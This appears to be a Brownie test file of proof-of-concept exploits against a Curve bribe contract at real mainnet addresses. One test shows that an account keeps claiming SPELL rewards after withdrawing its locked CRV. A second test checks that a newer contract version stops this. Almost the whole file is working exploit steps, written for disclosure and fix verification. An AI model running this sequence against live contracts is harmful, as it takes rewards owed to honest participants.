from typing import List, Union
from web3 import HTTPProvider
from brownie import (
    Contract,
    accounts,
    ZERO_ADDRESS,
    chain,
    web3,
    history,
    interface,
    Wei,
    ZERO_ADDRESS,
)


def test_exploit_v2():
    crv = Contract("0xD533a949740bb3306d119CC777fa900bA034cd52")
    ve = Contract("0x5f3b5DfEb7B28CDbD7FAba78963EE202a494e2A2")
    gauge_voter = Contract("0x2F50D538606Fa9EDD2B11E2446BEb18C9D5846bB")
    mim_guage = Contract("0xd8b712d29381748dB89c36BCa0138d7c75866ddF")
    spell_rewards = Contract("0x090185f2135308BaD17527004364eBcC2D37e5F6")
    bribev2 = Contract("0x7893bbb46613d7a4FbcC31Dab4C9b823FfeE1026")
    crv_holder = accounts.at("0x9B44473E223f8a3c047AD86f387B80402536B029", force=True)
    crv_holder = accounts.at("0x9B44473E223f8a3c047AD86f387B80402536B029", force=True)

    attacker1 = accounts[0]
    attacker2 = accounts[1]
    amount = 1_000_000 * 1e18
    crv.transfer(attacker1, amount, {"from": crv_holder})
    crv.transfer(attacker2, amount, {"from": crv_holder})

    crv.approve(ve, amount, {"from": attacker1})
    crv.approve(ve, amount, {"from": attacker2})

    time = chain.time()
    twoweek = 2 * 60 * 60 * 24 * 7

    # attacker 1 locks for 2 weeks. attacker2 locks for about 4 years
    ve.create_lock(amount, time + twoweek, {"from": attacker1})
    ve.create_lock(amount, time + 100 * twoweek, {"from": attacker2})

    attacker1_slop = ve.get_last_user_slope(attacker1)

    # despite the different locks both attackers have the same slope. This is what bribev2 uses to work out share of rewards
    assert attacker1_slop == ve.get_last_user_slope(attacker2)
    print("attackers slope is: ", attacker1_slop)

    gauge_voter.vote_for_gauge_weights(mim_guage, 10_000, {"from": attacker1})
    gauge_voter.vote_for_gauge_weights(mim_guage, 10_000, {"from": attacker2})
    assert (
        gauge_voter.vote_user_slopes(attacker1, mim_guage)[0]
        == gauge_voter.vote_user_slopes(attacker2, mim_guage)[0]
        == attacker1_slop
    )

    chain.sleep(twoweek)
    gauge_voter.checkpoint_gauge(mim_guage, {"from": crv_holder})

    # both claim their rewards
    bribev2.claim_reward(mim_guage, spell_rewards, {"from": attacker1})
    bribev2.claim_reward(mim_guage, spell_rewards, {"from": attacker2})

    first_reward = spell_rewards.balanceOf(attacker1) / 1e18
    print("first claim:", first_reward)

    chain.sleep(twoweek)
    # attacker 1 withdraws. At this point they now no longer have a slope and so should stop getting rewards
    ve.withdraw({"from": attacker1})
    assert ve.get_last_user_slope(attacker1) == 0

    # but they continue to claim rewerads
    bribev2.claim_reward(mim_guage, spell_rewards, {"from": attacker1})
    bribev2.claim_reward(mim_guage, spell_rewards, {"from": attacker2})

    second_reward = spell_rewards.balanceOf(attacker1) / 1e18
    print("second claim:", second_reward)
    assert second_reward > first_reward
    # even though attacker1 has no locked crv they are claiming the same number of rewards as attacker 2 who has a 4 year lock
    assert second_reward == spell_rewards.balanceOf(attacker2) / 1e18

    chain.sleep(twoweek)
    bribev2.claim_reward(mim_guage, spell_rewards, {"from": attacker1})
    bribev2.claim_reward(mim_guage, spell_rewards, {"from": attacker2})
    third_reward = spell_rewards.balanceOf(attacker1) / 1e18
    assert third_reward > second_reward

    # and this continues week after week. attacker1 can claim rewards forever
    assert third_reward == spell_rewards.balanceOf(attacker2) / 1e18

    print("third claim:", third_reward)


def test_exploit_v3(bribe, token1_whale):
    crv = Contract("0xD533a949740bb3306d119CC777fa900bA034cd52")
    ve = Contract("0x5f3b5DfEb7B28CDbD7FAba78963EE202a494e2A2")
    gauge_voter = Contract("0x2F50D538606Fa9EDD2B11E2446BEb18C9D5846bB")
    mim_guage = Contract("0xd8b712d29381748dB89c36BCa0138d7c75866ddF")
    spell_rewards = Contract("0x090185f2135308BaD17527004364eBcC2D37e5F6")
    bribev2 = Contract("0x7893bbb46613d7a4FbcC31Dab4C9b823FfeE1026")
    crv_holder = accounts.at("0x9B44473E223f8a3c047AD86f387B80402536B029", force=True)

    attacker1 = accounts[6]
    attacker2 = accounts[7]
    amount = 1_000_000 * 1e18
    crv.transfer(attacker1, amount, {"from": crv_holder})
    crv.transfer(attacker2, amount, {"from": crv_holder})

    crv.approve(ve, amount, {"from": attacker1})
    crv.approve(ve, amount, {"from": attacker2})

    time = chain.time()
    twoweek = 2 * 60 * 60 * 24 * 7

    # attacker 1 locks for 2 weeks. attacker2 locks for about 4 years
    ve.create_lock(amount, time + 2 * twoweek, {"from": attacker1})
    ve.create_lock(amount, time + 10 * twoweek, {"from": attacker2})

    attacker1_slop = ve.get_last_user_slope(attacker1)

    # despite the different locks both attackers have the same slope. This is what bribev2 uses to work out share of rewards
    assert attacker1_slop == ve.get_last_user_slope(attacker2)
    print("attackers slope is: ", attacker1_slop)

    spell_rewards.approve(bribe, 2**256 - 1, {"from": token1_whale})
    to_bribe = spell_rewards.balanceOf(bribev2)
    bribe.add_reward_amount(mim_guage, spell_rewards, to_bribe, {"from": token1_whale})

    gauge_voter.vote_for_gauge_weights(mim_guage, 10_000, {"from": attacker1})
    gauge_voter.vote_for_gauge_weights(mim_guage, 10_000, {"from": attacker2})
    assert (
        gauge_voter.vote_user_slopes(attacker1, mim_guage)[0]
        == gauge_voter.vote_user_slopes(attacker2, mim_guage)[0]
        == attacker1_slop
    )

    chain.sleep(twoweek)
    gauge_voter.checkpoint_gauge(mim_guage, {"from": crv_holder})

    # both claim their rewards
    bal1 = spell_rewards.balanceOf(attacker1)
    bribe.claim_reward(mim_guage, spell_rewards, {"from": attacker1})
    bal2 = spell_rewards.balanceOf(attacker1)
    bribev2.claim_reward(mim_guage, spell_rewards, {"from": attacker1})
    bal3 = spell_rewards.balanceOf(attacker1)
    print(f"--- ATTACKER 1 (4wk lock) ---")
    v2_earnings = (bal3 - bal2) / 1e18
    v3_earnings = (bal2 - bal1) / 1e18
    print(f"Earned from V2: {v2_earnings}")
    print(f"Earned from V3: {v3_earnings}")
    assert v2_earnings > v3_earnings

    bal1 = spell_rewards.balanceOf(attacker2)
    bribe.claim_reward(mim_guage, spell_rewards, {"from": attacker2})
    bal2 = spell_rewards.balanceOf(attacker2)
    bribev2.claim_reward(mim_guage, spell_rewards, {"from": attacker2})
    bal3 = spell_rewards.balanceOf(attacker2)
    print(f"--- ATTACKER 2 (200wk lock)---")
    v2_earnings = (bal3 - bal2) / 1e18
    v3_earnings = (bal2 - bal1) / 1e18
    print(f"Earned from V2: {v2_earnings}")
    print(f"Earned from V3: {v3_earnings}")
    assert v2_earnings > v3_earnings

    first_reward = spell_rewards.balanceOf(attacker1) / 1e18
    print("first claim:", first_reward)

    chain.sleep(2 * twoweek)
    # attacker 1 withdraws. At this point they now no longer have a slope and so should stop getting rewards
    ve.withdraw({"from": attacker1})
    assert ve.get_last_user_slope(attacker1) == 0

    # but they continue to claim rewerads
    prev = spell_rewards.balanceOf(attacker1) / 1e18
    bribe.claim_reward(mim_guage, spell_rewards, {"from": attacker1})
    bribe.claim_reward(mim_guage, spell_rewards, {"from": attacker2})

    new = spell_rewards.balanceOf(attacker1) / 1e18

    print("second claim:", new - prev)
    assert new - prev == 0
    # even though attacker1 has no locked crv they are claiming the same number of rewards as attacker 2 who has a 4 year lock
